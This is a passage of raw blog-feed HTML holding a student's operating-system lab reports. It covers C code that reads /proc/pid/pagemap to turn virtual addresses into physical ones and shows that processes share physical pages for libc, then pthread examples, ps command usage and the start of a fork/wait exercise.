class="string">&quot;/proc/&quot;</span>);</span><br><span class="line"><span class="built_in">strcat</span>(filename, buf);</span><br><span class="line"><span class="built_in">strcat</span>(filename, <span class="string">&quot;/pagemap&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Can be done in one step</span></span><br><span class="line"><span class="built_in">sprintf</span>(filename, <span class="string">&quot;/proc/%d/pagemap&quot;</span>, pid);</span><br></pre></td></tr></table></figure></li><li><p>Can output virtual addresses, page numbers, physical page framenumbers, physical addresses and other information of one or more globalvariables or custom functions in the process.</p></li></ol><p>Thinking:</p><ol type="1"><li><p>How to extend the experiment (write a general function) to showthe physical address corresponding to a specified virtual address of aspecified process.</p></li><li><p>How to extend the experiment to verify that different processes’shared libraries (e.g., some known, commonly called *.so libraries) havethe same physical address.</p></li></ol><h3 id="code-implementation-2">Code Implementation</h3><p>program.c implements output of virtual addresses, page numbers,physical page frame numbers, physical addresses and other information ofone or more global variables or custom functions.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">printPhysicalAddress</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *description, <span class="type">unsigned</span> <span class="type">long</span> vaddr)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> pageSize = getpagesize();                            <span class="comment">// Get system-set page size</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> v_pageIndex = vaddr / pageSize;            <span class="comment">// Calculate number of pages passed relative to 0x0 for this virtual address</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> v_offset = v_pageIndex * <span class="keyword">sizeof</span>(<span class="type">uint64_t</span>); <span class="comment">// Calculate offset in /proc/pid/page_map file</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> page_offset = vaddr % pageSize;            <span class="comment">// Calculate offset of virtual address within page</span></span><br><span class="line">    <span class="type">uint64_t</span> item = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> buf[<span class="number">200</span>];</span><br><span class="line">    <span class="built_in">sprintf</span>(buf, <span class="string">&quot;/proc/%d/pagemap&quot;</span>, getpid());</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> fd = open(buf, O_RDONLY);</span><br><span class="line">    <span class="keyword">if</span> (fd == <span class="number">-1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        perror(<span class="string">&quot;Error opening pagemap&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    lseek(fd, v_offset, SEEK_SET); <span class="comment">// Move file pointer to corresponding position in file to get item</span></span><br><span class="line">    <span class="keyword">if</span> (read(fd, &amp;item, <span class="keyword">sizeof</span>(<span class="type">uint64_t</span>)) != <span class="keyword">sizeof</span>(<span class="type">uint64_t</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        perror(<span class="string">&quot;Error reading pagemap&quot;</span>);</span><br><span class="line">        close(fd);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">uint64_t</span> phy_pageIndex = (((<span class="type">uint64_t</span>)<span class="number">1</span> &lt;&lt; <span class="number">55</span>) - <span class="number">1</span>) &amp; item;      <span class="comment">// Physical page number, i.e., take bits 0-54 of item</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> paddr = (phy_pageIndex * pageSize) + page_offset; <span class="comment">// Physical address = physical page number * page size + page offset</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;【%s】pid = %d, Virtual address = 0x%lx, Page number = %lu, Physical address = 0x%lx, Physical page frame number = %lu\n&quot;</span>,</span><br><span class="line">           description, getpid(), vaddr, v_pageIndex, paddr, phy_pageIndex);</span><br><span class="line"></span><br><span class="line">    close(fd);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> a = <span class="number">100</span>; <span class="comment">// Global constant</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> b = <span class="number">100</span>;                   <span class="comment">// Local variable</span></span><br><span class="line">    <span class="type">static</span> <span class="type">int</span> c = <span class="number">100</span>;            <span class="comment">// Local static variable</span></span><br><span class="line">    <span class="type">const</span> <span class="type">int</span> d = <span class="number">100</span>;             <span class="comment">// Local constant</span></span><br><span class="line">    <span class="type">char</span> *p = (<span class="type">char</span> *)<span class="built_in">malloc</span>(<span class="number">100</span>); <span class="comment">// Dynamic memory</span></span><br><span class="line"></span><br><span class="line">    printPhysicalAddress(<span class="string">&quot;Global constant&quot;</span>, (<span class="type">unsigned</span> <span class="type">long</span>)&amp;a);</span><br><span class="line">    printPhysicalAddress(<span class="string">&quot;Local variable&quot;</span>, (<span class="type">unsigned</span> <span class="type">long</span>)&amp;b);</span><br><span class="line">    printPhysicalAddress(<span class="string">&quot;Local static variable&quot;</span>, (<span class="type">unsigned</span> <span class="type">long</span>)&amp;c);</span><br><span class="line">    printPhysicalAddress(<span class="string">&quot;Local constant&quot;</span>, (<span class="type">unsigned</span> <span class="type">long</span>)&amp;d);</span><br><span class="line">    printPhysicalAddress(<span class="string">&quot;Dynamic memory&quot;</span>, (<span class="type">unsigned</span> <span class="type">long</span>)p);</span><br><span class="line">    <span class="built_in">free</span>(p);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>va2pa.c implements output of physical address corresponding to aspecified virtual address of a specified process.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Logic is the same as above, just pid and vaddr are parameters</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">printPhysicalAddressForProcess</span><span class="params">(<span class="type">pid_t</span> pid, <span class="type">unsigned</span> <span class="type">long</span> vaddr)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> pageSize = getpagesize();</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> v_pageIndex = vaddr / pageSize;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> v_offset = v_pageIndex * <span class="keyword">sizeof</span>(<span class="type">uint64_t</span>);</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> page_offset = vaddr % pageSize;</span><br><span class="line">    <span class="type">uint64_t</span> item = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> pagemap_file[<span class="number">256</span>];</span><br><span class="line">    <span class="built_in">sprintf</span>(pagemap_file, <span class="string">&quot;/proc/%d/pagemap&quot;</span>, pid);</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> fd = open(pagemap_file, O_RDONLY);</span><br><span class="line">    <span class="keyword">if</span> (fd == <span class="number">-1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        perror(<span class="string">&quot;Error opening pagemap&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    lseek(fd, v_offset, SEEK_SET);</span><br><span class="line">    <span class="keyword">if</span> (read(fd, &amp;item, <span class="keyword">sizeof</span>(<span class="type">uint64_t</span>)) != <span class="keyword">sizeof</span>(<span class="type">uint64_t</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        perror(<span class="string">&quot;Error reading pagemap&quot;</span>);</span><br><span class="line">        close(fd);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">uint64_t</span> phy_pageIndex = (((<span class="type">uint64_t</span>)<span class="number">1</span> &lt;&lt; <span class="number">55</span>) - <span class="number">1</span>) &amp; item;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> paddr = (phy_pageIndex * pageSize) + page_offset;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;pid = %d, Virtual address = 0x%lx, Page number = %lu, Physical address = 0x%lx, Physical page frame number = %lu\n&quot;</span>,</span><br><span class="line">           pid, vaddr, v_pageIndex, paddr, phy_pageIndex);</span><br><span class="line">    close(fd);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[])</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (argc != <span class="number">3</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Usage: %s &lt;pid&gt; &lt;virtual address&gt;\n&quot;</span>, argv[<span class="number">0</span>]);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">pid_t</span> pid = atoi(argv[<span class="number">1</span>]);</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> vaddr = strtoul(argv[<span class="number">2</span>], <span class="literal">NULL</span>, <span class="number">16</span>);</span><br><span class="line"></span><br><span class="line">    printPhysicalAddressForProcess(pid, vaddr);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>test.c is a test program used to verify that different processes’shared libraries have the same physical address. For example, the printffunction in this program is in the <strong>libc.so</strong> sharedlibrary.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;PID: %d, Virtual address of printf: %p\n&quot;</span>, getpid(), (<span class="type">void</span> *)<span class="built_in">printf</span>);</span><br><span class="line">    sleep(<span class="number">1000</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="program-execution-results-2">Program Execution Results</h3><blockquote><p>Must run with sudo, otherwise this file should not have permission toopen</p></blockquote><h4 id="program.c">program.c</h4><figure><imgsrc="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/3-4-program1.png"alt="program.c execution result" /><figcaption aria-hidden="true">program.c execution result</figcaption></figure><h4 id="va2pa.c-test.c">va2pa.c &amp;&amp; test.c</h4><p>Start two test processes, output the virtual addresses of the printffunction respectively. va2pa.c calculates the physical addressescorresponding to the virtual addresses of the printf function for bothprocesses.</p><figure><imgsrc="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/3-4-va2pa.png"alt="va2pa.c program execution result" /><figcaption aria-hidden="true">va2pa.c program executionresult</figcaption></figure><p>The two red boxes on the right print the pid of the currently runningtest program and the virtual address of the printf function, then usethe process number and virtual address as parameters for va2pa.c tocalculate the physical address. The results are shown in the two boxeson the left. The physical addresses corresponding to the virtualaddresses of the printf function for both processes (marked with bluehighlighter) are the same, proving that different processes’ sharedlibraries have the same physical address.</p>]]></content>
      
      
      <categories>
          
          <category> HUST Lab Reports </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Study Notes </tag>
            
            <tag> Course Experiments </tag>
            
            <tag> Operating System </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HUST Operating System Lab2: Process&amp;Thread Synchronization Mechanisms and Application Programming</title>
      <link href="/2023/11/29/HUST-Labs/HUST%20Operating%20System%20Lab2:%20Process&amp;Thread%20Synchronization%20Mechanisms%20and%20Application%20Programming/"/>
      <url>/2023/11/29/HUST-Labs/HUST%20Operating%20System%20Lab2:%20Process&amp;Thread%20Synchronization%20Mechanisms%20and%20Application%20Programming/</url>
      
        <content type="html"><![CDATA[<h1 id="operating-system-lab2">Operating System Lab2</h1><h2 id="experiment-objectives">Experiment Objectives</h2><ol type="1"><li>Understand the concepts and application programming process ofprocesses/threads;</li><li>Understand the synchronization mechanisms and applicationprogramming of processes/threads;</li><li>Master and promote domestic operating systems (recommend GalaxyKylin or Ubuntu Kylin)</li></ol><h2 id="experiment-content">Experiment Content</h2><ol type="1"><li>Create 2 threads A and B in Linux/Windows to loop output data orstrings.</li><li>Create (fork) a child process in Linux, experiment with wait/exitfunctions</li><li>Use threads to implement concurrent drawing of circles and squaresin Windows/Linux.</li><li>Use threads to implement “producer-consumer” synchronization controlin Windows or Linux</li><li>Use signal mechanism (signal) to implement inter-processcommunication in Linux</li><li>Simulate dining philosophers in Windows or Linux, provide deadlockand non-deadlock solutions.</li><li>Study Linux kernel and use printk to debug process creation andscheduling policy related information.</li></ol><h2id="task-1-create-2-threads-a-and-b-in-linuxwindows-to-loop-output-data-or-strings">Task1: Create 2 Threads A and B in Linux/Windows to Loop Output Data orStrings</h2><p>Requirements:</p><ol type="1"><li><p>Use pthread thread library or CreateThread function</p></li><li><p>Thread A outputs 1-1000 in ascending order; Thread B outputs1000-1 in descending order. To avoid output being too fast, output onenumber every 0.2 seconds (adjustable).</p></li><li><p>When outputting data, also output “A” or “B” to indicate whichthread is outputting, and pay attention to formatted output information.For example:</p><p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">A:1000</span><br><span class="line">A:0999</span><br><span class="line">B:0001</span><br><span class="line">A:0998</span><br><span class="line">B:0002</span><br></pre></td></tr></table></figure></p></li></ol><h3 id="write-code-and-compile">Write Code and Compile</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Thread A function - ascending output</span></span><br><span class="line"><span class="type">void</span>* <span class="title function_">print_numbers_ascending</span><span class="params">(<span class="type">void</span>* arg)</span> &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= <span class="number">1000</span>; i++) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;A:%04d\n&quot;</span>, i);</span><br><span class="line">        usleep(<span class="number">200000</span>); <span class="comment">// pause 0.2 seconds</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Thread B function - descending output</span></span><br><span class="line"><span class="type">void</span>* <span class="title function_">print_numbers_descending</span><span class="params">(<span class="type">void</span>* arg)</span> &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1000</span>; i &gt;= <span class="number">1</span>; i--) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;B:%04d\n&quot;</span>, i);</span><br><span class="line">        usleep(<span class="number">200000</span>); <span class="comment">// pause 0.2 seconds</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">pthread_t</span> threadA, threadB;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Create threads</span></span><br><span class="line">    pthread_create(&amp;threadA, <span class="literal">NULL</span>, print_numbers_ascending, <span class="literal">NULL</span>);</span><br><span class="line">    pthread_create(&amp;threadB, <span class="literal">NULL</span>, print_numbers_descending, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Wait for threads to finish</span></span><br><span class="line">    pthread_join(threadA, <span class="literal">NULL</span>);</span><br><span class="line">    pthread_join(threadB, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* pthread_create function: creates a thread</span></span><br><span class="line"><span class="comment"> * Function prototype int pthread_create(pthread_t *thread, const pthread_attr_t *attr, void *(*start_routine) (void *), void *arg);</span></span><br><span class="line"><span class="comment"> * pthread_t *thread: This is a pointer to a pthread_t type variable, pthread_t is usually used to identify threads. After the function executes successfully, this variable will be assigned the identifier of the newly created thread.</span></span><br><span class="line"><span class="comment"> * const pthread_attr_t *attr: Pointer to pthread_attr_t structure, used to set thread attributes. If NULL is passed, default attributes are used.</span></span><br><span class="line"><span class="comment"> * void *(*start_routine) (void *): Pointer to the function that will be executed by the new thread. This function must accept a void * type parameter and return a void * type value.</span></span><br><span class="line"><span class="comment"> * void *arg: Parameter passed to the start_routine function. This can be a pointer to any type, depending on your specific needs.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* pthread_join function: waits for a thread to terminate</span></span><br><span class="line"><span class="comment"> * Function prototype int pthread_join(pthread_t thread, void **retval);</span></span><br><span class="line"><span class="comment"> * pthread_t thread: The thread identifier to wait for. This is the identifier returned when creating a thread with pthread_create function.</span></span><br><span class="line"><span class="comment"> * void **retval: If not NULL, points to a location used to store the exit status returned by the thread. If the thread exits through pthread_exit, retval will contain the value passed to pthread_exit. If the thread exits by returning (i.e., the thread start routine returns), retval will contain the returned value.</span></span><br><span class="line"><span class="comment"> */</span></span><br></pre></td></tr></table></figure><p>Detailed explanation of pthread_create function:</p><figure><imgsrc="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/pthread_create.png"alt="Detailed explanation of pthread_create function" /><figcaption aria-hidden="true">Detailed explanation of pthread_createfunction</figcaption></figure><p>Use the command <code>gcc -o mission1 mission1.c -lpthread</code> tocompile the file and execute it.</p><h3 id="view-process-running-status-during-execution">View ProcessRunning Status During Execution</h3><p>Common commands for viewing processes or threads:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">ps -ef | grep [process name] <span class="comment"># View information of processes with specific names</span></span><br><span class="line">lixiang     4874    3403  0 11:11 pts/1    00:00:00 ./mission1</span><br><span class="line">lixiang     4883    3455  0 11:12 pts/2    00:00:00 grep --color=auto mission1</span><br><span class="line"></span><br><span class="line">ps -T -p [process PID] <span class="comment"># View information of process with specific PID (-T shows its threads)</span></span><br><span class="line">PID    SPID    TTY       TIME       CMD</span><br><span class="line">4874   4874   pts/1    00:00:00   mission1</span><br><span class="line">4874   4875   pts/1    00:00:00   mission1</span><br><span class="line">4874   4876   pts/1    00:00:00   mission1</span><br><span class="line"></span><br><span class="line">ps -Tfl -p [process PID] <span class="comment"># More detailed display of process information with specific PID (including CPU utilization, etc.)</span></span><br><span class="line">F S UID          PID    SPID    PPID  C PRI  NI ADDR SZ WCHAN  STIME TTY          TIME CMD</span><br><span class="line">0 S lixiang     4945    4945    3403  0  80   0 - 21144 futex_ 11:17 pts/1    00:00:00 ./mission1</span><br><span class="line">1 S lixiang     4945    4946    3403  0  80   0 - 21144 hrtime 11:17 pts/1    00:00:00 ./mission1</span><br><span class="line">1 S lixiang     4945    4947    3403  0  80   0 - 21144 hrtime 11:17 pts/1    00:00:00 ./mission1</span><br><span class="line"></span><br><span class="line"><span class="comment"># Below are introductions to commonly used parameters:</span></span><br><span class="line">-e: Display all processes, not just current user<span class="string">&#x27;s processes.</span></span><br><span class="line"><span class="string">-f: Display complete process information, including parent process ID, CPU utilization, etc.</span></span><br><span class="line"><span class="string">-l: Display process information in long format, including process status, PID, terminal, CPU utilization, etc.</span></span><br><span class="line"><span class="string">-u user: Display process information for specified user.</span></span><br><span class="line"><span class="string">-p pid: Display process information for specified PID.</span></span><br><span class="line"><span class="string">-s: Sort output by process start time.</span></span><br><span class="line"><span class="string">-r: Sort output by process CPU utilization.</span></span><br><span class="line"><span class="string">-T: Display threads</span></span><br></pre></td></tr></table></figure><p>After running mission1, use ps command to display its detailedinformation</p><figure><imgsrc="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/pid_spid.png"alt="Detailed information of mission1 process" /><figcaption aria-hidden="true">Detailed information of mission1process</figcaption></figure><p>In the figure, SPID represents the thread ID numbers, 3852 and 3852are the A and B threads we created</p><h3 id="program-execution-results">Program Execution Results</h3><figure><imgsrc="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/result.png"alt="Execution result" /><figcaption aria-hidden="true">Execution result</figcaption></figure><p>Reference Materials:</p><p><ahref="https://blog.csdn.net/qq_44824574/article/details/110672780">Linux- Thread Creation</a></p><p><ahref="https://blog.csdn.net/qq_37037348/article/details/131491031#:~:text=%E6%A6%82%E5%BF%B5%E5%92%8C%E5%8E%9F%E7%90%86%201%20ps%E5%91%BD%E4%BB%A4%E9%80%9A%E8%BF%87%E8%AF%BB%E5%8F%96%2Fproc%E7%9B%AE%E5%BD%95%E4%B8%8B%E7%9A%84%E8%BF%9B%E7%A8%8B%E4%BF%A1%E6%81%AF%E6%96%87%E4%BB%B6%E8%8E%B7%E5%8F%96%E8%BF%9B%E7%A8%8B%E7%9A%84%E8%AF%A6%E7%BB%86%E4%BF%A1%E6%81%AF%E3%80%82,2%20%E8%BF%9B%E7%A8%8B%E4%BF%A1%E6%81%AF%E6%96%87%E4%BB%B6%E4%B8%AD%E5%8C%85%E5%90%AB%E4%BA%86%E8%BF%9B%E7%A8%8B%E7%9A%84PID%E3%80%81%E7%8A%B6%E6%80%81%E3%80%81%E7%88%B6%E8%BF%9B%E7%A8%8BID%E3%80%81CPU%E5%88%A9%E7%94%A8%E7%8E%87%E3%80%81%E5%86%85%E5%AD%98%E5%8D%A0%E7%94%A8%E7%AD%89%E4%BF%A1%E6%81%AF%E3%80%82%203%20ps%E5%91%BD%E4%BB%A4%E8%A7%A3%E6%9E%90%E8%BF%9B%E7%A8%8B%E4%BF%A1%E6%81%AF%E6%96%87%E4%BB%B6%E5%B9%B6%E6%A0%BC%E5%BC%8F%E5%8C%96%E8%BE%93%E5%87%BA%EF%BC%8C%E4%BB%A5%E4%BE%BF%E7%94%A8%E6%88%B7%E6%9F%A5%E7%9C%8B%E3%80%82">psCommand Introduction</a></p><p><a href="https://www.linuxcool.com/ps">Complete ps CommandManual</a></p><h2id="task-2-create-fork-a-child-process-in-linux-experiment-with-waitexit-functions">Task2: Create (fork) a Child Process in Linux, Experiment with wait/exitFunctions</h2><p>Requirements:</p><ol type="1"><li>Effect 1: Parent process does not use wait function, let parentprocess end before child process, child process enters infinite loop orlong-term loop, observe process ID and parent process ID of parent andchild processes.<ol type="1"><li>Use printf in the program to output process number and parentprocess number of each process. Note, parent process and child processoutput should provide corresponding prompt strings for mutualdistinction, same below</li><li>At the same time, use ps command to display process list, observeprocess ID and parent process ID of specified processes, and explainwhether these IDs are consistent with those output by printf.</li></ol></li><li>Effect 2: Parent process uses wait function. Child process sleepsfor 5 seconds, parent process does not sleep. Child process uses exit toreturn parameters. Parent process printf the parameters returned bychild process.</li></ol><h3 id="effect-one">Effect One</h3><p>The core of this task is to let the parent process end before thechild process, observing the changes in process IDs.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span 